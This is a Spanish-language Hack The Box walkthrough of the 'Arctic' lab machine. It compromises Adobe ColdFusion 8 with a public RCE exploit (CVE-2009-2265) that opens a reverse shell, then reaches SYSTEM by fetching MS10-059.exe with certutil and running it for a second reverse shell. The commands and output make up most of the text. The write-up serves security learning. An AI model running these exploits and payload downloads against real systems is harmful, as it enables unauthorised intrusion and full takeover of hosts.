---
layout: single
title: Artic - Hack The Box
excerpt: "Una máquina algo sencilla, vamos a vulnerar el servicio Adobe ColdFusion 8 usando el Exploit CVE-2009-2264 que nos conectara directamente a la máquina usando una Reverse Shell, entraremos como usuario y usaremos el MS10-059 para ganar acceso como NT Authority System."
date: 2023-02-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-artic/artic_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - FTMP
  - Adobe ColdFusion
  - Remote Command Execution (RCE) 
  - RCE - CVE-2009-2265
  - Reverse Shell
  - Local Privilege Escalation (LPE) 
  - LPE - MS10-059
  - OSCP Style
---
![](/assets/images/htb-writeup-artic/artic_logo.png)
Una máquina algo sencilla, vamos a vulnerar el servicio **Adobe ColdFusion 8** usando el Exploit **CVE-2009-2264** que nos conectara directamente a la máquina usando una **Reverse Shell**, entraremos como usuario y usaremos el **MS10-059** para ganar acceso como **NT Authority System**.

ADVERTENCIA, esta máquina es bastante lenta, en su momento me desespere, pero "la paciencia es la madre de la ciencia", advertido estas.

# Recopilación de Información
## Traza ICMP
Realizamos un ping para saber si la máquina está conectada y en base al TTL sabremos que SO ocupa la máquina.
```
ping -c 4 10.10.10.11   
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=131 ms
64 bytes from 10.10.10.11: icmp_seq=2 ttl=127 time=135 ms
64 bytes from 10.10.10.11: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.11: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.11 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 130.538/131.733/134.557/1.638 ms
```
Al parecer la máquina usa Windows. Es momentos de hacer los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 13:43 CST
Initiating SYN Stealth Scan at 13:43
Scanning 10.10.10.11 [65535 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 13:43, 27.46s elapsed (65535 total ports)
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.28s latency).
Scanned at 2023-02-17 13:43:06 CST for 28s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
135/tcp  open  msrpc   syn-ack ttl 127
8500/tcp open  fmtp    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 30 (1.316KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Solamente hay 2 puertos activos y que yo recuerde no nos hemos enfrentado a esos dos, hagamos el escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p135,8500 10.10.10.11 -oN targeted                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 13:45 CST
Nmap scan report for 10.10.10.11
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8500/tcp open  fmtp?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.29 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Mmmmmm a kbron, no pues no nos dio mucha información que digamos. Vamos a investigar.

# Análisis de Vulnerabilidades
## Investigación de Servicios
Vamos a empezar por el **FMTP**:

**El SMTP o protocolo simple de transferencia de correo es un protocolo de red básico que permite que los emails viajen a través de internet. Es decir, es un protocolo de mensajería empleado para mandar un email de un punto A (un servidor de origen o servidor saliente) a un punto B (un servidor de destino o servidor entrante).**

**Un servidor SMTP es un ordenador encargado de llevar a cabo el servicio SMTP, que haciendo las veces de “cartero electrónico”, permite el transporte del correo electrónico por Internet.**

Ósea que es una página web, vamos a verla:

![](/assets/images/htb-writeup-artic/Captura1.png)

Hay solamente 2 carpetas, veamos que hay en la primera:

![](/assets/images/htb-writeup-artic/Captura2.png)

Hay una en especial que podemos ver, que es el directorio **administrator**. Antes de meternos ahí, veamos que hay en el otro directorio principal:

![](/assets/images/htb-writeup-artic/Captura3.png)

No hay nada que sea de interés que yo sepa, entonces vamos al directorio **administrator**:

![](/assets/images/htb-writeup-artic/Captura4.png)

Ok, ya tenemos un servicio más especifico, pero ¿qué es eso de **Adobe ColdFusion**? Investiguemos:

**Coldfusion es una plataforma de desarrollo rápido de aplicaciones web que usa el lenguaje de programación CFML. En este aspecto, es un producto similar a ASP, JSP o PHP. ColdFusion es una herramienta que corre en forma concurrente con la mayoría de los servidores web de Windows, Mac OS X, Linux y Solaris.**

Entonces, se esta desarrollando una aplicación web, por eso las credenciales que pide.

# Explotación Vulnerabilidades
## Buscando un Exploit
Como ya tenemos un servicio específico y la versión, entonces vamos a usar **Searchsploit**
```
searchsploit adobe coldfusion 8
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                        | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                     | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                        | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                         | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                              | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                          | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                         | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                        | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                  | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                     | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                            | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                  | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting               | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scri | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting     | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting      | cfm/webapps/33168.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Excelente, tenemos un RCE, vamos a analizarlo.

### Probando Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
```
searchsploit -x cfm/webapps/50057.py        
  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
    Codes: CVE-2009-2265
 Verified: False
File Type: Python script, ASCII text executable
```
Analizándolo, nos pide los siguientes datos:
```
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.16.4'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex
```
Solamente tenemos que cambiarlos, eso me indica que este Exploit es usable para **Metasploit**. Pero checa esto:
```
os.system(f'msfvenom -p java/jsp_shell_reverse_tcp
```
Está generando un Payload para conectarnos a la máquina de manera remota. Vamos a probar el Exploit.

* Cambiamos los datos:
```
    lhost = 'Tu_IP'
    lport = 443
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex
```
* Levantamos una netcat:
```
nc -nvlp 443    
listening on [any] 443 ...
```
* Y activamos el Exploit:
```
python Adobe_Exploit.py                                                          
Generating a payload...
Payload size: 1496 bytes
Saved as: f01dfac413bd448a82db8852a0a74b68.jsp
Priting request...
Content-type: multipart/form-data; boundary=0c8478e180f44be7af5362027e35ef54
Content-length: 1697
--0c8478e180f44be7af5362027e35ef54
Content-Disposition: form-data; name="newfile"; filename="f01dfac413bd448a82db8852a0a74b68.txt"
Content-Type: text/plain
...
```
* Tardo un poco pero ya estamos dentro:
```
nc -nvlp 443    
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49408
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```
La flag del usuario se encuentra en el directorio **tolis**:
```
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of C:\Users
22/03/2017  10:00 ��    <DIR>          .
22/03/2017  10:00 ��    <DIR>          ..
22/03/2017  09:10 ��    <DIR>          Administrator
14/07/2009  07:57 ��    <DIR>          Public
22/03/2017  10:00 ��    <DIR>          tolis
               0 File(s)              0 bytes
               5 Dir(s)   1.434.054.656 bytes free
```

# Post Explotación
Bueno ya estamos dentro, vamos a ver de qué nos podemos aprovechar para poder ganar acceso como Root.
```
C:\>cd Program Files
cd Program Files
C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of C:\Program Files
26/12/2017  01:13 ��    <DIR>          .
26/12/2017  01:13 ��    <DIR>          ..
26/12/2017  01:13 ��    <DIR>          Common Files
14/07/2009  08:41 ��    <DIR>          Internet Explorer
26/12/2017  01:13 ��    <DIR>          VMware
14/07/2009  06:20 ��    <DIR>          Windows Mail
14/07/2009  08:37 ��    <DIR>          Windows NT
               0 File(s)              0 bytes
               7 Dir(s)   1.434.054.656 bytes free
C:\Program Files>cd ..
cd ..
C:\>cd "Program Files (x86)"
cd "Program Files (x86)"
C:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of C:\Program Files (x86)
14/07/2009  08:06 ��    <DIR>          .
14/07/2009  08:06 ��    <DIR>          ..
14/07/2009  06:20 ��    <DIR>          Common Files
14/07/2009  08:41 ��    <DIR>          Internet Explorer
14/07/2009  06:20 ��    <DIR>          Windows Mail
14/07/2009  08:37 ��    <DIR>          Windows NT
               0 File(s)              0 bytes
               6 Dir(s)   1.434.054.656 bytes free
C:\Program Files (x86)>cd ..
cd ..
```
Pues no hay que sepa que podamos usar, veamos que privilegios tenemos:
```
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
Uffff tenemos el **SeImpersonatePrivilege** podemos aprovecharnos de ese, pero vamos a usar la herramienta **Windows Exploit Suggester** a ver que nos dice. Recuerda que vamos a necesitar la información del sistema, usa el comando **systeminfo** y copia todo en un archivo **.txt**.
```
python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
```
Hay varios Exploits que podemos usar, vamos a usar el **MS10-059** para poder ganar acceso como Root.

### Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)
Para descargarlo, usaremos el siguiente link:

* https://github.com/SecWiki/windows-kernel-exploits

Una vez descargado, lo pasamos a nuestro directorio de trabajo y lo vamos a subir a la máquina para activarlo, vámonos por pasos:

* Abrimos un servidor con Python:
```
python3 -m http.server                                                                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Nos vamos a la carpeta **Temp** y creamos la carpeta **Privesc** para guardar ahí el Exploit:
```
c:\>cd Windows/Temp
cd Windows/Temp
c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of c:\Windows\Temp
c:\Windows\Temp>mkdir Privesc
mkdir Privesc
c:\Windows\Temp>cd Privesc
cd Privesc
```
* Descargamos el Exploit desde la máquina usando **certutil.exe**:
```
c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.
```
* Levantamos una netcat:
```
nc -nvlp 1337     
listening on [any] 1337 ...
```
* Activamos el exploit:
```
c:\Windows\Temp\Privesc>MS10-059.exe 10.10.14.14 1337
MS10-059.exe 10.10.14.14 1337
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```
* ¡Y listo!, ya solamente buscamos la flag en el directorio **Administrator** y listo:
```
nc -nvlp 1337     
listening on [any] 1337 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49790
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
c:\Windows\Temp\Privesc>whoami
whoami
nt authority\system
```

# Otras Formas
### Prueba Exploit: Adobe ColdFusion - Directory Traversal
Existe otra forma de acceder a la máquina como usuario, para esto usaríamos el Exploit **Adobe ColdFusion - Directory Traversal**.

En el siguiente link, te explica cómo puedes obtener las credenciales para acceder al **Adobe ColdFusion** y usar una vulnerabilidad para cargar un Payload que tenga una **Reverse Shell** para que puedas accesar al sistema:

* https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

Este link viene en dicho Exploit: **CVE-2010-2861**

### Prueba Exploit: Juici Potato
Después de usar el **Windows Exploit Suggester**, intente probar algunos Exploits, estos son:
* MS11-011
* MS10-047
* MS11-046

El último lo utilizamos en la **máquina Devel** pero aquí no funciono ni ese ni los otros que liste. Quizá a ti te funcionen, pruébalos si tienes tiempo y si no pues ve a lo seguro.

He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante o el mismo que el **MS10-059**, no lo sé bien, aunque yo no probe **Juicy Potato** puedes intentarlo tu.

## Links de Investigación
* https://www.mailjet.com/es/blog/emailing/servidor-smtp/
* https://github.com/0xkasra/CVE-2009-2265
* https://www.google.com/search?client=firefox-b-e&q=Microsoft+Windows+Server+2008+R2+Standard++6.1.7600+N%2FA+Build+7600+exploit
* https://www.infosecmatter.com/nessus-plugin-library/?id=51911
* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
* https://github.com/egre55/windows-kernel-exploits
* https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

# FIN
